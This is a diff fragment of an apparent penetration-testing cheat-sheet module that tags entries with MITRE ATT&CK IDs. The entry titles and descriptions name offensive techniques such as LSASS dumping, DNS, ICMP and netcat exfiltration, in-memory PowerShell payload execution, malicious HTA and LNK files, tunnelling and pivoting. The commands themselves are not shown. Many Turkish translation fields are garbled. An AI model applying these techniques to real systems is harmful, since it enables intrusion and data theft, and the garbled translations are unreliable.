         "name_tr": "RDP Access"
@@ -14366,7 +16879,10 @@ module.exports = [
               "essential"
             ],
             "desc": "List available shares on a remote host",
-            "desc_tr": "List available shares on a remote host"
+            "desc_tr": "List available shares on a remote host",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "Access Share via smbclient",
@@ -14411,7 +16927,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Dump LSASS remotely"
+            "desc_tr": "Dump LSASS remotely",
+            "attack": [
+              "T1003.001"
+            ]
           }
         ],
         "name_tr": "File Shares & Data Collection"
@@ -15129,7 +17648,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Start an SMB server sharing the current directory",
-            "desc_tr": "Start an SMB server sharing the current directory"
+            "desc_tr": "Start an SMB server sharing the current directory",
+            "attack": [
+              "T1105"
+            ]
           },
           {
             "title": "Impacket SMB Server (With Auth)",
@@ -15138,7 +17660,10 @@ module.exports = [
               "essential"
             ],
             "desc": "SMB server with authentication required",
-            "desc_tr": "SMB server kimlik doğrulama required ile"
+            "desc_tr": "SMB server kimlik doğrulama required ile",
+            "attack": [
+              "T1105"
+            ]
           },
           {
             "title": "FTP Server (pyftpdlib)",
@@ -15207,7 +17732,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Download file using wget",
-            "desc_tr": "Download file using wget"
+            "desc_tr": "Download file using wget",
+            "attack": [
+              "T1105"
+            ]
           },
           {
             "title": "curl Download",
@@ -15292,7 +17820,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Download file using bash built-in /dev/tcp (no external tools)",
-            "desc_tr": "Download file using bash built-in /dev/tcp (no external tools)"
+            "desc_tr": "Download file using bash built-in /dev/tcp (no external tools)",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Wget Recursive Download",
@@ -15316,7 +17847,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Download file via certutil (LOLBin)",
-            "desc_tr": "Download file via certutil (LOLBin)"
+            "desc_tr": "Download file via certutil (LOLBin)",
+            "attack": [
+              "T1105"
+            ]
           },
           {
             "title": "PowerShell DownloadFile",
@@ -15325,7 +17859,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Download file via .NET WebClient",
-            "desc_tr": "Download file via .NET WebClient"
+            "desc_tr": "Download file via .NET WebClient",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell Invoke-WebRequest",
@@ -15334,7 +17871,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Download file via Invoke-WebRequest (IWR)",
-            "desc_tr": "Download file via Invoke-WebRequest (IWR)"
+            "desc_tr": "Download file via Invoke-WebRequest (IWR)",
+            "attack": [
+              "T1059.001",
+              "T1105"
+            ]
           },
           {
             "title": "PowerShell IEX (In-Memory)",
@@ -15343,7 +17884,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Download and execute PowerShell script in memory",
-            "desc_tr": "Download and execute PowerShell script in memory"
+            "desc_tr": "Download and execute PowerShell script in memory",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "BitsAdmin Download",
@@ -15361,7 +17905,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Download file via PowerShell BITS cmdlet",
-            "desc_tr": "Download file via PowerShell BITS cmdlet"
+            "desc_tr": "Download file via PowerShell BITS cmdlet",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Copy from SMB Share",
@@ -15392,7 +17939,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Upload file from target to attacker via HTTP POST",
-            "desc_tr": "Upload file from target to attacker via HTTP POST"
+            "desc_tr": "Upload file from target to attacker via HTTP POST",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Expand CAB File Transfer",
@@ -15436,7 +17986,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Encode file as base64 for text-based exfil (LOLBin)",
-            "desc_tr": "Encode file as base64 for text-based exfil (LOLBin)"
+            "desc_tr": "Encode file as base64 for text-based exfil (LOLBin)",
+            "attack": [
+              "T1048"
+            ]
           }
         ],
         "name_tr": "Windows Target Downloads"
@@ -15451,7 +18004,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "Exfiltrate data through DNS queries",
-            "desc_tr": "Exfiltrate data DNS queries üzerinden"
+            "desc_tr": "Exfiltrate data DNS queries üzerinden",
+            "attack": [
+              "T1048",
+              "T1590.002"
+            ]
           },
           {
             "title": "Exfil via ICMP",
@@ -15460,7 +18017,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Exfiltrate data embedded in ICMP packets",
-            "desc_tr": "Exfiltrate data embedded ICMP packets içinde"
+            "desc_tr": "Exfiltrate data embedded ICMP packets içinde",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "Exfil via curl POST",
@@ -15469,7 +18029,11 @@ module.exports = [
               "tool"
             ],
             "desc": "Exfiltrate file contents via HTTP POST",
-            "desc_tr": "Exfiltrate file contents HTTP POST üzerinden"
+            "desc_tr": "Exfiltrate file contents HTTP POST üzerinden",
+            "attack": [
+              "T1003.008",
+              "T1048"
+            ]
           },
           {
             "title": "Exfil via Netcat",
@@ -15478,7 +18042,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Compress and exfiltrate directory via netcat",
-            "desc_tr": "Compress and exfiltrate directory netcat üzerinden"
+            "desc_tr": "Compress and exfiltrate directory netcat üzerinden",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "Exfil via OpenSSL Encrypted",
@@ -15490,7 +18057,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Encrypted exfiltration via OpenSSL and netcat",
-            "desc_tr": "Encrypted exfiltratiOpenSSL and netcat üzerinden üzerinde"
+            "desc_tr": "Encrypted exfiltratiOpenSSL and netcat üzerinden üzerinde",
+            "attack": [
+              "T1048"
+            ]
           }
         ],
         "name_tr": "Exfiltration Techniques"
@@ -15523,7 +18093,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Base64 encode a file on Windows",
-            "desc_tr": "Base64 kodlama a file Windows üzerinde"
+            "desc_tr": "Base64 kodlama a file Windows üzerinde",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Base64 Decode (PowerShell)",
@@ -15532,7 +18105,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Base64 decode and write file on Windows",
-            "desc_tr": "Base64 kod çözme and write file Windows üzerinde"
+            "desc_tr": "Base64 kod çözme and write file Windows üzerinde",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "xxd Hex Encode",
@@ -15611,7 +18187,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Start Chisel server in reverse mode for client connections",
-            "desc_tr": "Start Chisel server in reverse mode for client connections"
+            "desc_tr": "Start Chisel server in reverse mode for client connections",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Chisel Client Reverse SOCKS",
@@ -15620,7 +18200,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Create reverse SOCKS5 proxy through Chisel",
-            "desc_tr": "Create reverse SOCKS5 proxy through Chisel"
+            "desc_tr": "Create reverse SOCKS5 proxy through Chisel",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Chisel Client Reverse Port Forward",
@@ -15629,7 +18213,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Reverse port forward a specific service through Chisel",
-            "desc_tr": "Reverse port forward a belirli service Chisel üzerinden"
+            "desc_tr": "Reverse port forward a belirli service Chisel üzerinden",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Chisel Client Forward SOCKS",
@@ -15638,7 +18226,11 @@ module.exports = [
               "tool"
             ],
             "desc": "Create forward SOCKS proxy through Chisel",
-            "desc_tr": "Create forward SOCKS proxy through Chisel"
+            "desc_tr": "Create forward SOCKS proxy through Chisel",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Chisel Client (HTTPS)",
@@ -15647,7 +18239,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "Tunnel Chisel through HTTPS to evade DPI",
-            "desc_tr": "Tunnel Chisel HTTPS evade DPI'e üzerinden"
+            "desc_tr": "Tunnel Chisel HTTPS evade DPI'e üzerinden",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "HTTPTunnel Server (Attacker)",
@@ -15674,7 +18270,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Generate web shell tunnel files for various languages",
-            "desc_tr": "Generate web shell tunnel files for various languages"
+            "desc_tr": "Generate web shell tunnel files for various languages",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Neo-reGeorg Connect",
@@ -15695,7 +18294,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "HTTP tunnel via deployed web shell for port forwarding",
-            "desc_tr": "HTTP tunnel deployed web kabuğu for port forwarding üzerinden"
+            "desc_tr": "HTTP tunnel deployed web kabuğu for port forwarding üzerinden",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "ABPTTS Tunnel",
@@ -15708,7 +18310,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "TCP tunneling over HTTP using ABPTTS",
-            "desc_tr": "TCP tunneling over HTTP ABPTTS kullanarak"
+            "desc_tr": "TCP tunneling over HTTP ABPTTS kullanarak",
+            "attack": [
+              "T1505.003"
+            ]
           }
         ],
         "name_tr": "HTTP/HTTPS Tunneling"
@@ -15723,7 +18328,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Start dnscat2 C2 server listening for DNS queries",
-            "desc_tr": "Start dnscat2 C2 server listening for DNS queries"
+            "desc_tr": "Start dnscat2 C2 server listening for DNS queries",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "dnscat2 Client",
@@ -15732,7 +18340,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Connect to dnscat2 server from target via DNS",
-            "desc_tr": "Connect to dnscat2 server from target via DNS"
+            "desc_tr": "Connect to dnscat2 server from target via DNS",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "dnscat2 PowerShell Client",
@@ -15741,7 +18352,11 @@ module.exports = [
               "tool"
             ],
             "desc": "Connect to dnscat2 from Windows via PowerShell",
-            "desc_tr": "Connect to dnscat2 from Windows via PowerShell"
+            "desc_tr": "Connect to dnscat2 from Windows via PowerShell",
+            "attack": [
+              "T1059.001",
+              "T1048"
+            ]
           },
           {
             "title": "Iodine Server",
@@ -15750,7 +18365,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Start iodine DNS tunnel server with virtual IP range",
-            "desc_tr": "Start iodine DNS tunnel server with virtual IP range"
+            "desc_tr": "Start iodine DNS tunnel server with virtual IP range",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "Iodine Client",
@@ -15759,7 +18377,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Connect to iodine DNS tunnel from target",
-            "desc_tr": "Connect to iodine DNS tunnel from target"
+            "desc_tr": "Connect to iodine DNS tunnel from target",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "dns2tcp Server",
@@ -15831,7 +18452,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Embed data in ICMP packets via nping",
-            "desc_tr": "Embed data ICMP packets nping üzerinden içinde"
+            "desc_tr": "Embed data ICMP packets nping üzerinden içinde",
+            "attack": [
+              "T1048"
+            ]
           }
         ],
         "name_tr": "ICMP Tunneling"
@@ -15903,7 +18527,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "Dynamic SOCKS proxy over SSL-wrapped SSH to evade DPI",
-            "desc_tr": "Dynamic SOCKS vekil sunucu (proxy) over SSL-wrapped SSH evade DPI'e"
+            "desc_tr": "Dynamic SOCKS vekil sunucu (proxy) over SSL-wrapped SSH evade DPI'e",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           }
         ],
         "name_tr": "Deep Packet Inspection Bypass"
@@ -16029,7 +18657,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Check the SPF record for email sender validation",
-            "desc_tr": "Kontrol et: the SPF record for email sender validation"
+            "desc_tr": "Kontrol et: the SPF record for email sender validation",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Check DKIM Record",
@@ -16038,7 +18669,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Look up DKIM selector DNS record",
-            "desc_tr": "DKIM selector DNS kaydını sorgula"
+            "desc_tr": "DKIM selector DNS kaydını sorgula",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Check DMARC Record",
@@ -16047,7 +18681,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Check DMARC policy for the target domain",
-            "desc_tr": "Kontrol et: DMARC policy for the target domain"
+            "desc_tr": "Kontrol et: DMARC policy for the target domain",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Check MX Records",
@@ -16056,7 +18693,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Look up mail exchange servers for the domain",
-            "desc_tr": "Alan adı için mail sunucularını (MX) sorgula"
+            "desc_tr": "Alan adı için mail sunucularını (MX) sorgula",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Full Email Security Check",
@@ -16070,7 +18710,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Comprehensive email security record enumeration",
-            "desc_tr": "Kapsamlı email security record listeleme"
+            "desc_tr": "Kapsamlı email security record listeleme",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Verify Email via SMTP",
@@ -16090,7 +18733,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Enumerate email addresses from public sources",
-            "desc_tr": "Enumerate email addresses from public sources"
+            "desc_tr": "Enumerate email addresses from public sources",
+            "attack": [
+              "T1589.002"
+            ]
           }
         ],
         "name_tr": "Email Reconnaissance"
@@ -16150,7 +18796,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Capture credentials via WPAD proxy auto-discovery",
-            "desc_tr": "Capture credentials via WPAD proxy auto-discovery"
+            "desc_tr": "Capture credentials via WPAD proxy auto-discovery",
+            "attack": [
+              "T1557.001"
+            ]
           }
         ],
         "name_tr": "Credential Harvesting"
@@ -16165,7 +18814,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Generate an HTA file that executes PowerShell meterpreter",
-            "desc_tr": "Generate an HTA file that executes PowerShell meterpreter"
+            "desc_tr": "Generate an HTA file that executes PowerShell meterpreter",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Macro Payload (msfvenom)",
@@ -16205,7 +18857,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Create a malicious LNK shortcut with hidden PowerShell execution",
-            "desc_tr": "Create a malicious LNK shortcut with hidden PowerShell execution"
+            "desc_tr": "Create a malicious LNK shortcut with hidden PowerShell execution",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "URL Shortener with Redirect",
@@ -16223,7 +18878,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Generate obfuscated PowerShell macro payload with Unicorn",
-            "desc_tr": "Generate obfuscated PowerShell macro payload with Unicorn"
+            "desc_tr": "Generate obfuscated PowerShell macro payload with Unicorn",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "ISO Payload Container",
@@ -16512,7 +19170,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Generate all byte values (0x01-0xFF) for bad character analysis",
-            "desc_tr": "Generate all byte values (0x01-0xFF) for bad character analysis"
+            "desc_tr": "Generate all byte values (0x01-0xFF) for bad character analysis",
+            "attack": [
+              "T1059.006"
+            ]
           },
           {
             "title": "msfvenom Bad Char Shellcode",
@@ -16648,7 +19309,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Pack an address in little-endian format for exploit payload",
-            "desc_tr": "Pack an address little-endian format for istismar payload içinde"
+            "desc_tr": "Pack an address little-endian format for istismar payload içinde",
+            "attack": [
+              "T1059.006"
+            ]
           },
           {
             "title": "Python struct.pack (64-bit)",
@@ -16657,7 +19321,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Pack a 64-bit address in little-endian format",
-            "desc_tr": "Pack a 64-bit address little-endian format içinde"
+            "desc_tr": "Pack a 64-bit address little-endian format içinde",
+            "attack": [
+              "T1059.006"
+            ]
           },
           {
             "title": "Pwntools Basic Template",
@@ -16683,7 +19350,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Quick one-liner remote exploit with pwntools",
-            "desc_tr": "Hızlı one-liner uzak istismar pwntools ile"
+            "desc_tr": "Hızlı one-liner uzak istismar pwntools ile",
+            "attack": [
+              "T1059.006"
+            ]
           },
           {
             "title": "Pwntools Shellcraft",
@@ -16736,7 +19406,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Generate a NOP sled for shellcode alignment",
-            "desc_tr": "Generate a NOP sled for shellcode alignment"
+            "desc_tr": "Generate a NOP sled for shellcode alignment",
+            "attack": [
+              "T1059.006"
+            ]
           }
         ],
         "name_tr": "Scripting Exploits"
@@ -16761,7 +19434,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Step 1: Host discovery scan across the target range",
-            "desc_tr": "Step 1: aktif host keşfi tarama the target range genelinde"
+            "desc_tr": "Step 1: aktif host keşfi tarama the target range genelinde",
+            "attack": [
+              "T1046",
+              "T1018"
+            ]
           },
           {
             "title": "Full Nmap Workflow — All Ports",
@@ -16770,7 +19447,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Step 2: Scan all 65535 TCP ports quickly",
-            "desc_tr": "Step 2: tarama tüm 65535 TCP ports quickly"
+            "desc_tr": "Step 2: tarama tüm 65535 TCP ports quickly",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Full Nmap Workflow — Service Enum",
@@ -16779,7 +19459,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Step 3: Service version and default script scan on open ports",
-            "desc_tr": "Step 3: Service versiand default script tarama on açık portlar üzerinde"
+            "desc_tr": "Step 3: Service versiand default script tarama on açık portlar üzerinde",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Full Nmap Workflow — Vuln Scan",
@@ -16788,7 +19471,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Step 4: Run vulnerability scripts against discovered services",
-            "desc_tr": "Step 4: Run zafiyet(ler) scripts discovered services'e karşı"
+            "desc_tr": "Step 4: Run zafiyet(ler) scripts discovered services'e karşı",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Full Nmap Workflow — UDP Top Ports",
@@ -16797,7 +19483,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Step 5: Quick scan of top UDP ports",
-            "desc_tr": "Step 5: Quick tarama of top UDP ports"
+            "desc_tr": "Step 5: Quick tarama of top UDP ports",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Web Enum — Identify Technology",
@@ -16815,7 +19504,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Step 2: Brute force directories and files",
-            "desc_tr": "Step 2: kaba kuvvet saldırısı directories and files"
+            "desc_tr": "Step 2: kaba kuvvet saldırısı directories and files",
+            "attack": [
+              "T1110.001",
+              "T1595.003"
+            ]
           },
           {
             "title": "Web Enum — Nikto Scan",
@@ -16833,7 +19526,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Step 4: Discover virtual hosts and subdomains",
-            "desc_tr": "Adım 4: Sanal hostları ve alt alan adlarını keşfet"
+            "desc_tr": "Adım 4: Sanal hostları ve alt alan adlarını keşfet",
+            "attack": [
+              "T1595.003"
+            ]
           }
         ],
         "name_tr": "Phase 1 — Reconnaissance Checklist"
@@ -16858,7 +19554,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Check for null session SMB share listing",
-            "desc_tr": "Kontrol et: for boş oturum SMB share listing"
+            "desc_tr": "Kontrol et: for boş oturum SMB share listing",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "Quick Win: NFS Shares",
@@ -16950,7 +19649,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Upgrade raw shell to fully interactive TTY",
-            "desc_tr": "Upgrade raw shell fully interactive TTY'e"
+            "desc_tr": "Upgrade raw shell fully interactive TTY'e",
+            "attack": [
+              "T1059.004",
+              "T1059.006"
+            ]
           },
           {
             "title": "Post-Exploit Step 2: User Context",
@@ -16964,7 +19667,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Establish current user context and network position",
-            "desc_tr": "Establish mevcut user context and network position"
+            "desc_tr": "Establish mevcut user context and network position",
+            "attack": [
+              "T1033",
+              "T1016"
+            ]
           },
           {
             "title": "Post-Exploit Step 3: Sudo Check",
@@ -16973,7 +19680,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Check what commands the current user can run as sudo",
-            "desc_tr": "Kontrol et: what commands the mevcut user can run as sudo"
+            "desc_tr": "Kontrol et: what commands the mevcut user can run as sudo",
+            "attack": [
+              "T1548.003"
+            ]
           },
           {
             "title": "Post-Exploit Step 4: SUID Binaries",
@@ -16982,7 +19692,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Find SUID binaries for potential privilege escalation",
-            "desc_tr": "Find SUID binaries for potential privilege escalation"
+            "desc_tr": "Find SUID binaries for potential privilege escalation",
+            "attack": [
+              "T1548.001"
+            ]
           },
           {
             "title": "Post-Exploit Step 5: Cron Jobs",
@@ -16996,7 +19709,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Enumerate scheduled tasks for exploitation",
-            "desc_tr": "Enumerate scheduled tasks for exploitation"
+            "desc_tr": "Enumerate scheduled tasks for exploitation",
+            "attack": [
+              "T1053.005",
+              "T1053.003"
+            ]
           },
           {
             "title": "Post-Exploit Step 6: Capabilities",
@@ -17014,7 +19731,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Check kernel version and OS for kernel exploits",
-            "desc_tr": "Kontrol et: kernel versiand OS for kernel exploits üzerinde"
+            "desc_tr": "Kontrol et: kernel versiand OS for kernel exploits üzerinde",
+            "attack": [
+              "T1082",
+              "T1068"
+            ]
           },
           {
             "title": "Post-Exploit Step 8: Network Info",
@@ -17029,7 +19750,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Enumerate network config for pivoting opportunities",
-            "desc_tr": "Enumerate network config for pivoting opportunities"
+            "desc_tr": "Enumerate network config for pivoting opportunities",
+            "attack": [
+              "T1016",
+              "T1049"
+            ]
           },
           {
             "title": "Post-Exploit Step 9: Sensitive Files",
@@ -17043,7 +19768,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Search for sensitive files, configs, and backups",
-            "desc_tr": "Search for sensitive files, configs, and backups"
+            "desc_tr": "Search for sensitive files, configs, and backups",
+            "attack": [
+              "T1003.008"
+            ]
           },
           {
             "title": "Windows Post-Exploit: User Info",
@@ -17057,7 +19785,12 @@ module.exports = [
               "essential"
             ],
             "desc": "Windows equivalent of basic post-exploitation enumeration",
-            "desc_tr": "Windows equivalent of basic post-istismar listeleme"
+            "desc_tr": "Windows equivalent of basic post-istismar listeleme",
+            "attack": [
+              "T1033",
+              "T1082",
+              "T1087"
+            ]
           },
           {
             "title": "Windows Post-Exploit: Stored Creds",
@@ -17070,7 +19803,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Search for stored credentials and passwords in Windows",
-            "desc_tr": "Search for stored credentials and passwords in Windows"
+            "desc_tr": "Search for stored credentials and passwords in Windows",
+            "attack": [
+              "T1552.001"
+            ]
           }
         ],
         "name_tr": "Phase 3 — Post-Exploitation Checklist"
@@ -17090,7 +19826,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Identify dual-homed interfaces and internal networks",
-            "desc_tr": "Tespit et: dual-homed interfaces and internal networks"
+            "desc_tr": "Tespit et: dual-homed interfaces and internal networks",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "Pivot Step 2: Internal Host Discovery",
@@ -17099,7 +19838,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Quick ping sweep of internal subnet from pivot host",
-            "desc_tr": "Hızlı ping sweep of internal subnet pivot host üzerinden"
+            "desc_tr": "Hızlı ping sweep of internal subnet pivot host üzerinden",
+            "attack": [
+              "T1018"
+            ]
           },
           {
             "title": "Pivot Step 3: Upload Tunnel Tool",
@@ -17108,7 +19850,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Transfer tunneling tool to the compromised host",
-            "desc_tr": "Transfer tunneling tool the compromised host'e"
+            "desc_tr": "Transfer tunneling tool the compromised host'e",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Pivot Step 4: Create SOCKS Proxy",
@@ -17120,7 +19866,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Establish SOCKS proxy through the pivot for proxychains",
-            "desc_tr": "Establish SOCKS vekil sunucu (proxy) the pivot for proxychains üzerinden"
+            "desc_tr": "Establish SOCKS vekil sunucu (proxy) the pivot for proxychains üzerinden",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Pivot Step 5: Configure Proxychains",
@@ -17129,7 +19879,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Add SOCKS proxy to proxychains configuration",
-            "desc_tr": "Add SOCKS proxy to proxychains configuration"
+            "desc_tr": "Add SOCKS proxy to proxychains configuration",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Pivot Step 6: Scan Through Proxy",
@@ -17138,7 +19892,12 @@ module.exports = [
               "essential"
             ],
             "desc": "Port scan internal targets through the pivot",
-            "desc_tr": "port taraması internal targets the pivot üzerinden"
+            "desc_tr": "port taraması internal targets the pivot üzerinden",
+            "attack": [
+              "T1046",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "SSH Dynamic Port Forward",
@@ -17147,7 +19906,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Create SOCKS proxy via SSH dynamic port forwarding",
-            "desc_tr": "Create SOCKS proxy via SSH dynamic port forwarding"
+            "desc_tr": "Create SOCKS proxy via SSH dynamic port forwarding",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "SSH Local Port Forward",
@@ -17156,7 +19919,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Forward a specific internal service to attacker's localhost",
-            "desc_tr": "Forward a specific internal service to attacker's localhost"
+            "desc_tr": "Forward a specific internal service to attacker's localhost",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Double Pivot (SSH Chain)",
@@ -17188,7 +19955,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Capture proof of compromise on Linux targets",
-            "desc_tr": "Capture proof of compromise on Linux targets"
+            "desc_tr": "Capture proof of compromise on Linux targets",
+            "attack": [
+              "T1033",
+              "T1016"
+            ]
           },
           {
             "title": "Windows Proof Capture",
@@ -17204,7 +19975,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Capture proof of compromise on Windows targets",
-            "desc_tr": "Capture proof of compromise on Windows targets"
+            "desc_tr": "Capture proof of compromise on Windows targets",
+            "attack": [
+              "T1033",
+              "T1016"
+            ]
           },
           {
             "title": "Screenshot with Timestamp (Linux)",
@@ -17222,7 +19997,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Capture terminal output to a file for proof",
-            "desc_tr": "Capture terminal output to a file for proof"
+            "desc_tr": "Capture terminal output to a file for proof",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "Archive Engagement Data",
@@ -17250,7 +20028,11 @@ module.exports = [
               "essential"
             ],
             "desc": "FTP: version scan, anonymous access, brute force",
-            "desc_tr": "FTP: version scan, anonymous access, brute force"
+            "desc_tr": "FTP: version scan, anonymous access, brute force",
+            "attack": [
+              "T1110.001",
+              "T1046"
+            ]
           },
           {
             "title": "Port 22 — SSH Checks",
@@ -17263,7 +20045,11 @@ module.exports = [
               "essential"
             ],
             "desc": "SSH: version scan, algorithm audit, brute force",
-            "desc_tr": "SSH: version scan, algorithm audit, brute force"
+            "desc_tr": "SSH: version scan, algorithm audit, brute force",
+            "attack": [
+              "T1110.001",
+              "T1046"
+            ]
           },
           {
             "title": "Port 25 — SMTP Checks",
@@ -17275,7 +20061,10 @@ module.exports = [
               "essential"
             ],
             "desc": "SMTP: commands, user enumeration, vulnerability scan",
-            "desc_tr": "SMTP: commands, user enumeration, vulnerability scan"
+            "desc_tr": "SMTP: commands, user enumeration, vulnerability scan",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 53 — DNS Checks",
@@ -17288,7 +20077,11 @@ module.exports = [
               "essential"
             ],
             "desc": "DNS: zone transfer, full record enumeration",
-            "desc_tr": "DNS: zone transfer, full record enumeration"
+            "desc_tr": "DNS: zone transfer, full record enumeration",
+            "attack": [
+              "T1046",
+              "T1590.002"
+            ]
           },
           {
             "title": "Port 80/443 — HTTP(S) Checks",
@@ -17301,7 +20094,10 @@ module.exports = [
               "essential"
             ],
             "desc": "HTTP: technology identification, vuln scan, directory brute",
-            "desc_tr": "HTTP: technology identification, vuln scan, directory brute"
+            "desc_tr": "HTTP: technology identification, vuln scan, directory brute",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "Port 110/995 — POP3 Checks",
@@ -17314,7 +20110,10 @@ module.exports = [
               "tool"
             ],
             "desc": "POP3: capabilities, authentication testing",
-            "desc_tr": "POP3: capabilities, kimlik doğrulama testing"
+            "desc_tr": "POP3: capabilities, kimlik doğrulama testing",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 111 — NFS/RPC Checks",
@@ -17327,7 +20126,10 @@ module.exports = [
               "essential"
             ],
             "desc": "NFS/RPC: share enumeration and mounting",
-            "desc_tr": "NFS/RPC: share listeleme and mounting"
+            "desc_tr": "NFS/RPC: share listeleme and mounting",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 135/139/445 — SMB Checks",
@@ -17341,7 +20143,11 @@ module.exports = [
               "essential"
             ],
             "desc": "SMB: share enum, user enum, vuln scan, null session",
